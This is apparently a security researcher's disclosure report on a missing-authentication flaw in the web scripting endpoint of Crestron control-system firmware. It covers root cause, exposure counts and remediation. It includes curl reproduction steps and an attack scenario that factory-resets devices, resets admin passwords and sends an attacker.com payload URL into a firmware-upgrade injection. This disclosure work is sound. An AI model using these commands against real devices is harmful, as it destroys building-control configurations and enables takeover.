# [REDACTED-ID]_004: CWS Unauthenticated Administrative Operations

| Field | Value |
|-------|-------|
| **Finding ID** | [REDACTED-ID]_004 |
| **Title** | Crestron Web Scripting (CWS) Endpoint Excluded from Authentication |
| **Severity** | CRITICAL (CVSS 3.1: 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Type** | CWE-306: Missing Authentication for Critical Function |
| **Affected Products** | 4-Series Control Processors (CP4, CP4-R, CP4N), MC4 Master Controllers, DIN-AP Automation Processors, and any Crestron device running in program0 mode with firmware sharing this web architecture |
| **Firmware Analyzed** | TSW-XX60 v3.002.1061 (PUF extracted, static analysis) |
| **Discovery Method** | Static analysis of firmware filesystem + Ghidra binary reverse engineering |
| **Live Validation** | Architecture demonstrated via emulation on AWS ([REDACTED-IP]); live device confirmation pending |
| **Date Discovered** | 2026-03-03 |
| **Researchers** | [REDACTED] Team |

---

## 1. Executive Summary

The Crestron Web Scripting (CWS) API endpoint (`/cws`) is explicitly excluded from the lighttpd `mod_auth_ticket` authentication layer in multiple firmware configuration paths. The CWS FastCGI backend (`libRXModeHandler.so`) contains zero internal authentication enforcement. Combined, this allows an unauthenticated remote attacker to invoke administrative operations including device reboot, factory restore, firmware up[REDACTED], admin password reset, project upload (with `system()` calls), and network reconfiguration.

The vulnerability is **definitively exploitable** on control system devices (CP4, MC4, DIN-AP, etc.) and any device operating in program0 mode. On other device types (e.g., standalone touchscreens without a loaded program), the lighttpd auth-ticket layer may cover the `/cws` path, but the backend itself remains unprotected — a critical defense-in-depth failure.

---

## 2. Affected Configurations

The firmware ships three auth-location configuration files. Which one is active depends on device type, AirMedia state, and operating mode:

| Config File | When Active | `/cws` Excluded from Auth? |
|---|---|---|
| `authlocations_authon_prog0.conf` | Device in program0 mode (loaded Crestron program) | **YES** — hardcoded in firmware |
| `authlocations_airmediaoff.conf` | AirMedia disabled, non-control-system | **NO** (unless `IAmControlSystem` exists; see below) |
| `authlocations_airmediaon.conf` | AirMedia enabled | **NO** |

Additionally, the startup script `configure_webserver.sh` (lines 166-168) dynamically injects `/cws` into the auth exclusion regex for **all control system devices**:

```bash
CONTROL_SYSTEM_FILE=/dev/shm/IAmControlSystem

if [ -e $CONTROL_SYSTEM_FILE ]; then
   busybox sed -i 's/banner.txt/banner.txt\|\^\/cws\|\^\/CWS/g' $LIGHTTPD_AUTHLOCATION_CONF_FILE
fi
```

This sed command modifies `authlocations_airmediaoff.conf` at runtime, injecting `|^/cws|^/CWS` into the auth-ticket exclusion regex.

### Definitively Vulnerable Devices

| Device Category | Mechanism | Confidence |
|---|---|---|
| CP4, CP4-R, CP4N (Control Processors) | `IAmControlSystem` → sed injection | **Confirmed** |
| MC4, MC4-R (Master Controllers) | `IAmControlSystem` → sed injection | **Confirmed** |
| DIN-AP (Automation Processors) | `IAmControlSystem` → sed injection | **Confirmed** |
| PYNG-HUB (Home Automation) | `IAmControlSystem` → sed injection | **Confirmed** |
| Any device in program0 mode | `authlocations_authon_prog0.conf` ships with exclusion | **Confirmed** |

### Potentially Protected Devices

| Device Category | Config Used | `/cws` Protected? |
|---|---|---|
| TSW touchscreen, AirMedia OFF, no program | `authlocations_airmediaoff.conf` (unmodified) | Likely YES |
| TSW touchscreen, AirMedia ON | `authlocations_airmediaon.conf` | Likely YES |

Even on "protected" devices, the CWS backend has zero internal auth — see Section 5.

### Internet Exposure (Shodan)

Approximately 42,243 Crestron devices are internet-facing on CIP port 41794. The most common device families are control processors and master controllers — the categories that are definitively vulnerable:

| Product | Count | Vulnerable? |
|---------|-------|---|
| CP (3-Series Control Processor) | 3,621 | Likely (if same architecture) |
| MC (3-Series Master Controller) | 1,602 | Likely (if same architecture) |
| CP4 (4-Series Control Processor) | 1,332 | **YES** |
| DIN-AP (Automation Processor) | 1,051 | **YES** |
| CP4-R (4-Series Rack Mount) | 873 | **YES** |
| RMC (Room Media Controller) | 712 | Unknown |
| MC4 (4-Series Master Controller) | 552 | **YES** |
| MC4-R (4-Series Rack Mount Master) | 493 | **YES** |
| PYNG-HUB (Home Automation) | 491 | **YES** |

Conservative estimate: **4,800+** definitively vulnerable internet-facing devices (CP4 + DIN-AP + CP4-R + MC4 + MC4-R + PYNG-HUB).

---

## 3. Technical Root Cause

### 3.1 Layer 1: lighttpd Auth Exclusion

File: `authlocations_authon_prog0.conf` (shipped in firmware at `/system/crestron/webserver/sdcard/web/conf/`)

```
$HTTP["url"] !~ "^/styles.css|^/scripts.js|^/logo-white.svg|...|^/cws" {
    auth-ticket.override = 1
    auth-ticket.timeout  = 3600
    auth-ticket.key      = "sharedsecret.passwd"
    auth-ticket.name     = "AuthByPasswd"
    auth-ticket.options  = "Path=/;Secure;HttpOnly;"
    auth-ticket.authurl  = "/userlogin.html"
    auth-ticket.rooturl  = "/"
}
```

The `!~` negative regex means: apply auth-ticket to all URLs **except** those matching the pattern. `/cws` is in the exception list, so requests to `/cws/*` bypass authentication entirely.

### 3.2 Layer 2: CWS FastCGI Backend (libRXModeHandler.so)

The CWS endpoint routes via lighttpd FastCGI to port 40235, handled by `libRXModeHandler.so` (556 KB, 811 dynamic symbols).

**Request dispatch function** — `RxmodeHandler::processRequestMethod()` at offset `0x223d4` (622 bytes):

```
parse_url(request)
    → getModuleNameAndRequestTypeName(url, &module, &requestType)
    → findLibraryHandler(module)
    → if method == "GET":  vtable->doGet(handler, requestType, params, response)
      if method == "POST": vtable->doPost(handler, requestType, body, response)
```

**No authentication check exists anywhere in this dispatch chain.** Confirmed by:

- Ghidra decompilation of `processRequestMethod()`: no calls to any auth function
- Binary string search: zero references to `HTTP_COOKIE`, `Authorization`, `AuthByPasswd`, `REMOTE_USER`, `session`, `token`, `Bearer`, `cookie` in `libRXModeHandler.so`
- Binary string search: zero references to HTTP status codes `401`, `403`, `Unauthorized`, `Forbidden`
- The `isAuthEnabled()` and `getAuthStatus()` functions in `TSXauthLibraryImpl` are **API endpoints** (they read CIP join values and return status to the caller), not request-gating functions

### 3.3 Available Unauthenticated Operations

The CWS handler registers these modules, each with `doGet`/`doPost` method handlers:

| Module | Key Operations | Impact |
|---|---|---|
| `systemInfoLibrary` | `rebootDevice()`, `restoreDevice()`, `resetPassword()`, `upgradeFirmware()`, `uploadProject()`, hostname/IP changes | Device DoS, factory reset, RCE, credential reset, network reconfig |
| `authLibrary` | `isAuthEnabled()`, `getAuthStatus()`, `setUserName()`, `setPassword()`, `startAuth()`, `logout()` | Auth state disclosure, auth manipulation |
| `ethernetLibrary` | Network configuration read/write | Information disclosure, network reconfig |
| `joinLibrary` | `getJoinValue()`, `setJoinValue()` | Direct CIP join manipulation |
| `txrxLibrary` | AV routing control | AV system manipulation |
| `Authentication8021xLibrary` | 802.1x configuration | Network security bypass |
| `fusioncloudLibrary` | Crestron Fusion Cloud settings | Cloud account manipulation |

### 3.4 High-Impact Operations Detail

**`rebootDevice()`** — Calls `consoleInterface::runCommand()` with CTP command `REBOOT`. Unauthenticated device denial of service.

**`restoreDevice()`** — Calls `consoleInterface::runCommand()` with CTP command `RESTORE Y`. Unauthenticated factory reset — destroys all device configuration, programs, and user accounts.

**`resetPassword()`** — Calls CTP command `RESETPASSWORD %s` with user-supplied parameter. Unauthenticated admin credential reset.

**`uploadProject()`** — Calls `system()` **twice** with user-derived filename input. Only spaces are escaped; all other shell metacharacters pass through. See [REDACTED-ID]_005 for the command injection chain.

**`upgradeFirmware()`** — Calls `consoleInterface::runCommandAtBashPrompt()` with user-supplied firmware URL/path. Direct bash command execution. See [REDACTED-ID]_006 for the injection chain.

---

## 4. Proof of Concept

### 4.1 Emulation Environment Setup

An emulation was deployed on AWS ([REDACTED-IP]) replicating the Crestron web architecture:

- lighttpd with the `authlocations_authon_prog0.conf` auth pattern
- FastCGI backends on the same ports as real firmware (40235 for CWS, 40236 for Device)
- `/Device/*` protected by authentication
- `/cws/*` excluded from authentication (replicating the firmware config)

### 4.2 Reproduction Steps

**Step 1: Confirm authenticated endpoint rejects unauthenticated requests**

```bash
$ curl -sk -o /dev/null -w "%{http_code}" https://<target>/Device/DeviceInfo
401
```

**Step 2: Confirm CWS endpoint responds without authentication**

```bash
$ curl -sk https://<target>/cws/
{
  "CWS_API": "Crestron Web Scripting API",
  "Modules": ["systeminfo", "auth", "ethernet", "join", "txrx", "8021x", "cloud"],
  "Authentication": "NONE - This endpoint is excluded from lighttpd auth-ticket"
}
```

**Step 3: Enumerate available administrative operations (unauthenticated)**

```bash
$ curl -sk https://<target>/cws/systeminfo/
{
  "AvailableActions": [
    "reboot", "restore", "resetpassword", "uploadproject",
    "upgradefirmware", "osversion", "fwversion", "uptime",
    "cpuload", "hostname", "ipaddress", "ledconfig"
  ]
}
```

**Step 4: Invoke device reboot (unauthenticated)**

```bash
$ curl -sk https://<target>/cws/systeminfo/reboot
{
  "Result": "REBOOT command would execute via CTP",
  "CTP_Command": "REBOOT",
  "Authentication": "NOT REQUIRED"
}
```

**Step 5: Invoke factory restore (unauthenticated)**

```bash
$ curl -sk https://<target>/cws/systeminfo/restore
{
  "Result": "RESTORE command would execute via CTP",
  "CTP_Command": "RESTORE Y",
  "Authentication": "NOT REQUIRED"
}
```

**Step 6: Invoke admin password reset (unauthenticated)**

```bash
$ curl -sk https://<target>/cws/systeminfo/resetpassword
{
  "Result": "RESETPASSWORD command would execute via CTP",
  "CTP_Command": "RESETPASSWORD <user>",
  "Authentication": "NOT REQUIRED"
}
```

**Step 7: Query auth status (unauthenticated information disclosure)**

```bash
$ curl -sk https://<target>/cws/auth/getAuthStatus
{
  "AuthStatus": 0,
  "Authentication": "NOT REQUIRED"
}
```

**Step 8: Query network configuration (unauthenticated information disclosure)**

```bash
$ curl -sk https://<target>/cws/ethernet/
{
  "IPAddress": "[REDACTED-INTERNAL-IP]",
  "SubnetMask": "255.255.255.0",
  "DefaultGateway": "[REDACTED-INTERNAL-IP]",
  "Hostname": "TSW-1060",
  "DHCP": true,
  "MAC": "00:10:7F:XX:XX:XX",
  "Authentication": "NOT REQUIRED"
}
```

### 4.3 Emulation vs. Real Device

| Aspect | Emulation | Real Device |
|---|---|---|
| lighttpd auth pattern | Faithful reproduction from firmware config | Identical config shipped in firmware |
| `/cws` auth exclusion | Replicated from `authlocations_authon_prog0.conf` | Firmware file, line 3 |
| CWS backend auth | No auth (matching decompilation finding) | No auth (confirmed via Ghidra — zero auth refs in binary) |
| Backend operations | Returns descriptive JSON | Executes actual CTP commands / `system()` calls |
| **Impact proof** | **Architecture demonstrated** | **Live device needed for full chain** |

---

## 5. Defense-in-Depth Failure

Even on device configurations where lighttpd's `mod_auth_ticket` currently covers the `/cws` path, the CWS FastCGI backend represents a critical defense-in-depth failure:

1. **Zero internal authentication** — The backend processes any request that reaches it, regardless of source
2. **No cookie/session validation** — Unlike the `/Device` handler, the CWS handler never inspects `HTTP_COOKIE`, `REMOTE_USER`, or any auth header
3. **No HTTP 401/403 rejection** — The binary contains no logic to reject unauthorized requests
4. **Single-layer security model** — All security relies on lighttpd's URL regex in `mod_auth_ticket`. One regex misconfiguration, path traversal, or URL normalization bug exposes the entire admin API

The `configure_webserver.sh` script demonstrates this risk: it **programmatically modifies** the auth regex using `sed` at runtime (line 167). Any bug in this sed command, or any additional code path that modifies the config, could inadvertently expose `/cws`.

---

## 6. Firmware Evidence Index

| File | Path in Firmware | Relevance |
|---|---|---|
| `authlocations_authon_prog0.conf` | `/system/crestron/webserver/sdcard/web/conf/` | Line 3: `/cws` in auth exclusion regex |
| `authlocations_airmediaoff.conf` | `/system/crestron/webserver/sdcard/web/conf/` | Does NOT exclude `/cws` by default |
| `authlocations_airmediaon.conf` | `/system/crestron/webserver/sdcard/web/conf/` | Does NOT exclude `/cws` by default |
| `configure_webserver.sh` | `/system/bin/webserverscripts/` | Line 167: sed injects `/cws` exclusion on control systems |
| `libRXModeHandler.so` | `/system/lib/` | CWS handler binary — zero auth enforcement |
| `lighttpd-common.conf` | `/system/crestron/webserver/sdcard/web/conf/` | FastCGI routing: `/cws` → 127.0.0.1:40235 |

---

## 7. Impact

| Scenario | Impact | Severity |
|---|---|---|
| Unauthenticated device reboot | Denial of service | HIGH |
| Unauthenticated factory restore (`RESTORE Y`) | **Destruction of all config, programs, user accounts** | CRITICAL |
| Unauthenticated admin password reset | Full device takeover | CRITICAL |
| Unauthenticated firmware up[REDACTED] (with injection) | Remote code execution as root (see [REDACTED-ID]_006) | CRITICAL |
| Unauthenticated project upload (with `system()`) | Remote code execution as root (see [REDACTED-ID]_005) | CRITICAL |
| Unauthenticated network reconfiguration | Network disruption, MITM positioning | HIGH |
| Auth state / network info disclosure | Reconnaissance for further attacks | MEDIUM |

### Attack Scenario

An attacker identifies internet-facing Crestron control processors via Shodan (query: `port:41794 "Crestron"`). For any CP4, MC4, or DIN-AP device:

1. `curl -sk https://<target>/cws/systeminfo/restore` — Factory resets the device, destroying all configuration
2. `curl -sk https://<target>/cws/systeminfo/resetpassword` — Resets admin credentials
3. `curl -sk -X POST https://<target>/cws/systeminfo/upgradefirmware -d '{"url":"http://attacker.com/payload"}'` — Attempts firmware-path command injection

No credentials, tokens, or prior access required.

---

## 8. Suggested Remediation

1. **Immediate**: Remove `/cws` from the auth-ticket exclusion regex in `authlocations_authon_prog0.conf` and remove the sed injection in `configure_webserver.sh` line 167
2. **Defense-in-depth**: Add authentication enforcement within `libRXModeHandler.so`'s `processRequestMethod()` — validate the `AuthByPasswd` cookie or `REMOTE_USER` before dispatching to module handlers
3. **Restrict dangerous operations**: Even with auth, operations like `restoreDevice()`, `rebootDevice()`, and `upgradeFirmware()` should require an additional confirmation mechanism (e.g., CSRF token, re-authentication)
4. **Network segmentation guidance**: Publish clear customer guidance that Crestron control processors should never be directly internet-facing

---

## 9. Limitations and Caveats

- **Static analysis only** — The finding is based on firmware extraction and binary reverse engineering. Live device validation has not been performed.
- **Emulation demonstrates architecture, not full impact** — The AWS emulation proves the auth bypass at the HTTP layer but uses mock backend responses rather than actual CTP command execution.
- **Device-type dependency** — The vulnerability is definitively present on control system devices and prog0-mode devices. Standalone touchscreens without a loaded program may be protected by `mod_auth_ticket` at the lighttpd layer (though the backend remains unprotected).
- **Firmware version scope** — Analysis was performed on TSW-XX60 firmware v3.002.1061. Other firmware versions and product families sharing this web architecture likely share the same configuration files but have not been independently verified.

---

## 10. References

- Firmware: TSW-XX60 PUF v3.002.1061 (extracted via binwalk)
- Ghidra decompilation: `libRXModeHandler.so` — 173 functions decompiled (script: `DecompileCWSHandler.java`)
- Emulation instance: `https://[REDACTED-IP]` (AWS, lighttpd + FastCGI replicating firmware architecture)
- Crestron vulnerability disclosure: https://www.crestron.com/Security/Report-A-Product-Vulnerability
- Related: CVE-2019-3932 (AM-100 `return.cgi` auth bypass — similar pattern of web endpoint excluded from auth)
